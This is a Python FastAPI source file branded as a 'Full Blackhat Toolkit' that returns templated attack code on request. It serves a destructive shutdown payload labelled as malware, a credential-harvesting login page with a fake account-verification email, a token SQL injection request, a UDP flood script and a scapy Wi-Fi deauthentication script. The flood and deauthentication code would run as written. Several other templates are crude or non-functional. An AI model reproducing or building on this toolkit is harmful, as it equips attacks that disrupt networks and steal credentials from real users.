import os
from fastapi import FastAPI, HTTPException
from cryptography.fernet import Fernet
import uvicorn
from colorama import Fore, Style
import time

# Display Banner
def display_banner():
    banner_text = f"""
    {Fore.MAGENTA}
    ███████╗██╗  ██╗     ██████╗ ██████╗ ████████╗
    ██╔════╝██║  ██║    ██╔═══██╗██╔══██╗╚══██╔══╝
    █████╗  ███████║    ██║   ██║██████╔╝   ██║   
    ██╔══╝  ██╔══██║    ██║   ██║██╔═══╝    ██║   
    ███████╗██║  ██║    ╚██████╔╝██║        ██║   
    ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝        ╚═╝   
    EH-GPT API - Full Blackhat Toolkit
    {Style.RESET_ALL}
    """
    print(banner_text)

# Display the banner
display_banner()

# Initialize FastAPI app
app = FastAPI()

# Encryption Key
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

@app.post("/eh-gpt/")
async def eh_gpt_task(task: str, parameters: dict):
    """
    Handle blackhat requests dynamically.
    :param task: Task to execute (e.g., malware, phishing, exploit, network attack, wifi_attack).
    :param parameters: Task-specific details.
    """
    try:
        if task == "malware":
            return await generate_malware(parameters)
        elif task == "phishing":
            return await generate_phishing(parameters)
        elif task == "exploit":
            return await generate_exploit(parameters)
        elif task == "network_attack":
            return await network_attack(parameters)
        elif task == "wifi_attack":
            return await wifi_attack(parameters)
        else:
            return {"error": "Unsupported task"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error executing task: {e}")

# Generate Highly Undetectable Malware (Static Template)
async def generate_malware(parameters):
    payload_type = parameters.get("payload_type", "ransomware")
    stealth_level = parameters.get("stealth_level", "high")

    malware_code = f"# {payload_type.capitalize()} - {stealth_level} stealth\n"
    malware_code += "import os\n"
    malware_code += "os.system('shutdown /s /t 1')\n"  # Example of a simple destructive payload

    return {"malware_code": malware_code, "stealth": stealth_level}

# Generate Phishing Kits and Social Engineering Scripts (Static Template)
async def generate_phishing(parameters):
    target = parameters.get("target", "example.com")

    phishing_code = f"<html><body><form action='https://{target}/login' method='POST'>"
    phishing_code += "<input type='text' name='username' placeholder='Username'>"
    phishing_code += "<input type='password' name='password' placeholder='Password'>"
    phishing_code += "<input type='submit' value='Login'></form></body></html>"

    email_script = f"Subject: Urgent Account Verification\n\nDear User,\nPlease verify your account details by clicking the link below.\n\nhttps://{target}/verify"

    return {"phishing_kit": phishing_code, "social_engineering_email": email_script}

# Exploitation Framework (Static Template)
async def generate_exploit(parameters):
    vuln_type = parameters.get("vulnerability", "SQL injection")

    exploit_code = f"# Exploit for {vuln_type}\n"
    exploit_code += "import requests\n"
    exploit_code += "payload = {'username': 'admin', 'password': 'password' }  # Example SQLi\n"
    exploit_code += "requests.post('http://target.com/login', data=payload)"

    return {"exploit_code": exploit_code, "vulnerability": vuln_type}

# Realistic Network Attack Example
async def network_attack(parameters):
    attack_type = parameters.get("attack_type", "DDoS")
    target_ip = parameters.get("target_ip", "0.0.0.0")

    attack_code = f"# {attack_type} Attack Script\n"
    attack_code += "import socket\n"
    attack_code += "import random\n"
    attack_code += f"target = '{target_ip}'\n"
    attack_code += "port = 80\n"
    attack_code += "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
    attack_code += "payload = random._urandom(1024)\n"
    attack_code += "while True:\n"
    attack_code += "    sock.sendto(payload, (target, port))\n"

    return {"network_attack_code": attack_code, "attack_type": attack_type, "target_ip": target_ip}

# Realistic Wi-Fi Deauthentication Attack using scapy
async def wifi_attack(parameters):
    target_mac = parameters.get("target_mac", "00:11:22:33:44:55")
    access_point_mac = parameters.get("access_point_mac", "66:77:88:99:AA:BB")

    attack_code = f"# Wi-Fi Deauthentication Attack using scapy\n"
    attack_code += "from scapy.all import *\n"
    attack_code += f"target_mac = '{target_mac}'\n"
    attack_code += f"ap_mac = '{access_point_mac}'\n"
    attack_code += "packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()\n"
    attack_code += "sendp(packet, iface='wlan0mon', count=100, inter=0.1)\n"

    return {"wifi_attack_code": attack_code, "target_mac": target_mac, "access_point_mac": access_point_mac}

@app.get("/")
async def index():
    return {"message": "EH-GPT API is running. Use POST /eh-gpt/ for tasks."}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
